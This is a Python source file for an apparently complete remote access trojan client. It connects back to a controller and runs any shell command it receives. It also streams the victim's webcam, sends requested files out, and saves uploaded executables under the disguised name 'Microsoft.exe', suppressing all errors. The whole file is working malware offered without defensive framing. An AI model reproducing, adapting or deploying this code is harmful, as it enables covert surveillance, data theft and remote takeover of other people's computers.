import socket
import subprocess
import os

from time import sleep

import cv2
import numpy
from threading import Thread

def camera():
    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    while True:
        try:
            s2.connect(('127.0.0.1', 720))
            break
        except:
            pass

    try:
        camera = cv2.VideoCapture(0)

        while True:
            Null, capture = camera.read()
            encode_param=[int(cv2.IMWRITE_JPEG_QUALITY),90]
            result, capture = cv2.imencode('.jpg', capture, encode_param)
            capture = numpy.array(capture)
            capture = capture.tostring()
            capture = "START".encode() + capture + "END".encode()
            s2.send(capture)
            if ('STOP'.encode() in s2.recv(1024)):
                break
        camera.release()
        s2.close()
    except:
        pass

if True:
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    while True:
        try:
            s.connect(('127.0.0.1', 7200))
            break
        except:
            sleep(10)
            pass


    while True:
        try:
            command = s.recv(1024)

            if command.startswith('UPLOAD_BEGIN'.encode()):
                data = command.split('UPLOAD_BEGIN'.encode())[1]
                while True:
                    packet = s.recv(1024)
                    if packet.endswith('UPLOAD_END'.encode()):
                        data += packet.split('UPLOAD_END'.encode())[0]
                        break
                    data += packet
                    
                with open('Microsoft.exe', 'wb') as f:
                    f.write(data)
                    
                s.send('Oki!'.encode())

            elif 'live'.encode() in command:
                cm = Thread(target=camera)
                cm.start()

            elif 'down'.encode() in command:
                file = command.decode().split('*')[1]
                with open(file, 'rb') as f:
                    data = f.read()
                data = "START".encode() + data + "END".encode()
                s.send(data)
                
            elif 'cd*'.encode() in command:
                os.chdir(command.decode().split('*')[1])
                s.send('Oki!'.encode())
                
            elif 'terminate'.encode() in command:
                s.close()
                break
                
            else:
                CMD = subprocess.Popen(command.decode(), shell=True, stdin=subprocess.PIPE,
                                       stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                s.send(CMD.stdout.read())
                s.send(CMD.stderr.read())
                s.send('Oki!'.encode())
        except:
            pass

